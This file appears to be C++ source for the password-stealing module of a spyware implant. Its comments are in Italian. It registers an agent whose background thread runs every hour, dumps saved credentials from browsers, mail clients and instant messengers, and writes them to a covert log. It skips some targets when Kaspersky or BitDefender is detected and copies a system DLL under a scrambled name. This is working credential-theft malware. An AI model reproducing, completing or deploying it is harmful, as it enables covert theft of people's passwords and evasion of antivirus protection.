
// modules declarations
extern int DumpFirefox(void);
extern int DumpChrome(void);
extern int DumpThunderbird(void);
extern int DumpIExplorer(void);
extern int DumpMSN(void);
extern int DumpOutlook(void);
extern int DumpPaltalk(void);
extern int DumpGtalk(void);
extern int DumpTrillian(void);
extern int DumpOpera(void);
extern void FireFoxInitFunc(void);
extern void FireFoxUnInitFunc(void);

//globals
HANDLE hfpwd;
#define PASSWORD_SLEEP_TIME (1000*60*60) //millisecondi  (ogni ora)

// Globals
BOOL g_bPasswordForceExit = FALSE;	// Semaforo per l'uscita del thread (e da tutti i clicli nelle funzioni chiamate)
BOOL bPM_PasswordStarted = FALSE;	// Indica se l'agente e' attivo o meno
HANDLE hPasswordThread = NULL;		// Thread di cattura
DWORD g_password_delay = 0;			// Il delay deve essere assoluto (non deve ricominciare ad ogni sync)


int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass)
{
	bin_buf tolog;
	DWORD delimiter = ELEM_DELIMITER;

	tolog.add(resource, (wcslen(resource)+1)*sizeof(WCHAR));
	tolog.add(user, (wcslen(user)+1)*sizeof(WCHAR));
	tolog.add(pass, (wcslen(pass)+1)*sizeof(WCHAR));
	tolog.add(service, (wcslen(service)+1)*sizeof(WCHAR));
	tolog.add(&delimiter, sizeof(DWORD));

	return (int)Log_WriteFile(hfpwd, tolog.get_buf(), tolog.get_len());
}

int LogPasswordA(CHAR *resource, CHAR *service, CHAR *user, CHAR *pass)
{
	bin_buf tolog;
	DWORD delimiter = ELEM_DELIMITER;
	WCHAR buffer[512];

	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", resource);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", user);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", pass);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	_snwprintf_s(buffer, sizeof(buffer)/sizeof(WCHAR), _TRUNCATE, L"%S", service);		
	tolog.add(buffer, (wcslen(buffer)+1)*sizeof(WCHAR));
	tolog.add(&delimiter, sizeof(DWORD));

	return (int)Log_WriteFile(hfpwd, tolog.get_buf(), tolog.get_len());
}


BOOL CopyPStoreDLL(char *dll_path)
{
	char sys_path[DLLNAMELEN];
	char comp_path[DLLNAMELEN*2];
	char *dll_scramb_name;
	
	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
		return FALSE;
	sprintf(comp_path, "%s%s%s", sys_path, "\\system32\\", "pstorec.dll");
	
	if ( !(dll_scramb_name = LOG_ScrambleName(H4_DUMMY_NAME, 2, TRUE)) )
		return FALSE;

	FNC(CopyFileA)(comp_path, HM_CompletePath(dll_scramb_name, dll_path), TRUE);
	SAFE_FREE(dll_scramb_name);
	return TRUE;
}


void DumpPasswords()
{
	hfpwd = Log_CreateFile(PM_PSTOREAGENT, NULL, 0);

	// Browsers
	DumpFirefox();
	DumpIExplorer();
	DumpOpera();
	DumpChrome();

	// Mail clients
	DumpThunderbird();

	// Kaspersky (con cui non mette piu' il driver) rompe i coglioni su questi
	if (!IsKaspersky() && !IsBitDefender()) {
		DumpOutlook();
		DumpMSN();
	}

	// Instant Messengers
	DumpPaltalk();
	DumpGtalk();
	DumpTrillian();

	Log_CloseFile(hfpwd);
}

DWORD WINAPI CapturePasswordThread(DWORD dummy)
{
	LOOP {
		// Se e' appena partito prende subito i contatti
		if (g_password_delay == 0) {
			FireFoxInitFunc();
			DumpPasswords();
		}

		// Sleepa 
		while (g_password_delay < PASSWORD_SLEEP_TIME) {
			Sleep(200);
			g_password_delay += 200;
			CANCELLATION_POINT(g_bPasswordForceExit);
		}
		g_password_delay = 0;
	}
}


DWORD __stdcall PM_PStoreAgentStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;
	if (bPM_PasswordStarted == bStartFlag)
		return 0;

	bPM_PasswordStarted = bStartFlag;

	if (bStartFlag) {
		// Se e' stato startato esplicitamente, ricomincia catturando
		if (bReset)
			g_password_delay = 0;

		// Crea il thread che cattura le password
		hPasswordThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CapturePasswordThread, NULL, 0, &dummy);
	} else {
		QUERY_CANCELLATION(hPasswordThread, g_bPasswordForceExit);
	}

	return 1;
}


DWORD __stdcall PM_PStoreAgentInit(JSONObject elem)
{
	return 1;
}

DWORD __stdcall PM_PStoreAgentUnregister()
{
	FireFoxUnInitFunc();
	return 1;
}

void PM_PStoreAgentRegister()
{
	AM_MonitorRegister(L"password", PM_PSTOREAGENT, NULL, (BYTE *)PM_PStoreAgentStartStop, (BYTE *)PM_PStoreAgentInit, (BYTE *)PM_PStoreAgentUnregister);
}